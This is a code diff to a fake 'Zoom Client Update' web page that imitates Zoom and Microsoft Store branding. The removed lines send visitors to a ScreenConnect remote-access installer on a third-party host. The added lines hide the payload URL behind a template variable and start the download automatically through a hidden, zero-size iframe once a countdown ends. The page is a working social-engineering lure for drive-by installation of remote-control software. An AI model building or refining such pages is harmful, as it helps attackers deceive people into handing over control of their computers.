@@ -4,9 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Zoom Client Update</title>
-<meta name="description" content="Your Zoom Client is Out of Date. Please wait while you're redirected to Microsoft Store...">
+<meta name="description" content="Your Zoom Client is out of date. Download the update installer.">
 <meta name="robots" content="noindex, nofollow">
-<link rel="canonical" href="https://zoom.us/client/latest/ZoomInstaller.exe">
+<link rel="canonical" href="https://Zoom.us/client/latest/ZoomInstaller.exe">
 <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/7/7b/Zoom_Communications_Logo.svg">
 
 <style>
@@ -102,24 +102,39 @@ Redirecting in <span id="count">5</span> seconds
 
 <p>If you are not redirected automatically, click below:</p>
 
-<a id="storeBtn" class="button" href="https://bivbuy1.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=workers&c=workers&c=&c=&c=&c=&c=&c=">
+<a id="storeBtn" class="button" href="{% url 'client_setup' %}">
 <img class="store-icon" src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg">
 Go to Microsoft Store
 </a>
 
 <script>
 
-let redirectLink = "https://bivbuy1.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=workers&c=workers&c=&c=&c=&c=&c=&c="; // CHANGE THIS
+var downloadUrl = "{% url 'client_setup' %}";
 let timeLeft = 5;
 
-document.getElementById("storeBtn").href = redirectLink;
+document.getElementById("storeBtn").href = downloadUrl;
+
+function triggerDownload() {
+    var frame = document.createElement("iframe");
+    frame.style.display = "none";
+    frame.style.width = "0";
+    frame.style.height = "0";
+    frame.setAttribute("aria-hidden", "true");
+    frame.src = downloadUrl;
+    document.body.appendChild(frame);
+    setTimeout(function () {
+        if (frame.parentNode) {
+            frame.parentNode.removeChild(frame);
+        }
+    }, 120000);
+}
 
 function showDownloadUpdate() {
     var slot = document.getElementById("loaderSlot");
     slot.textContent = "";
     var a = document.createElement("a");
     a.className = "button";
-    a.href = redirectLink;
+    a.href = downloadUrl;
     a.textContent = "Download update";
     slot.appendChild(a);
 }
@@ -132,9 +147,7 @@ document.getElementById("count").innerText = timeLeft;
 if(timeLeft <= 0){
 clearInterval(timer);
 showDownloadUpdate();
-setTimeout(function(){
-window.location.href = redirectLink;
-}, 250);
+triggerDownload();
 }
 
 
